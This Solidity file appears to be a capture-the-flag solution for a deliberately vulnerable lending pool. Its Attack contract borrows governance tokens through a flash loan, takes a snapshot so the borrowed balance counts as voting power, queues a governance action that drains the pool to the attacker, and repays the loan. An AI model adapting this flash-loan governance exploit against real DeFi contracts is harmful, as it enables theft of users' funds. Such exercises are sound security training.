// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

contract Attack {
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    DamnValuableTokenSnapshot dvtSnapshot;
    address owner;
    uint256 public actionId;

    constructor (
        SelfiePool _selfiePool, 
        SimpleGovernance _simpleGovernance,
        DamnValuableTokenSnapshot _dvtSnapshot
    ) {
        selfiePool = _selfiePool;
        simpleGovernance = _simpleGovernance;
        dvtSnapshot = _dvtSnapshot;
        owner = msg.sender;
    }

    function receiveTokens(address token, uint256 amount) external {
        require(msg.sender == address(selfiePool));
        dvtSnapshot.snapshot();
        actionId = simpleGovernance.queueAction(
            address(selfiePool), 
            abi.encodeWithSignature("drainAllFunds(address)", owner), 
            0
        );
        IERC20(token).transfer(payable(msg.sender), amount);
    }

    function attack(uint256 amount) external {
        selfiePool.flashLoan(amount);
    }
}